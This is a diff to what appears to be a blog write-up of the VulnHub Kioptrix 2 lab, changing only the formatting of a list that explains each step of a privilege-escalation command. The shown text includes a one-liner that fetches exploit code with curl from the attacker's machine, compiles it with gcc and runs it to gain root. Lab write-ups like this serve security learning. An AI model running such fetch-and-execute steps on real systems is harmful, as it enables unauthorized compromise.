@@ -148,15 +148,15 @@ cd /tmp && id && curl 192.168.0.213/exploit.c -o exploit.c 2> /dev/null && gcc e
 
 <img src="/assets/img/blog/vulnhub-kioptrix2/Kioptrix2-05.JPG">
 
-`**cd /tmp** - changes directory into tmp`
+`cd /tmp - changes directory into tmp`
 
 `id - prints user information before privilege escalation`
 
-`**curl IP/exploit.c** - makes an HTTP request to our machine where /exploit.c is path to corresponding exploit, -o saves the output of the request`
+`curl IP/exploit.c - makes an HTTP request to our machine where /exploit.c is path to corresponding exploit, -o saves the output of the request`
 
-`**gcc exploit.c** - compiles our C code using GCC`
+`gcc exploit.c - compiles our C code using GCC`
 
-`**./a.out** - runs the compiled binary from GCC (every compiled file by this compiler has default output name of a.out)`
+`./a.out - runs the compiled binary from GCC (every compiled file by this compiler has default output name of a.out)`
 
 ## <centre>Congratulations! The box has been rooted!</centre>
 
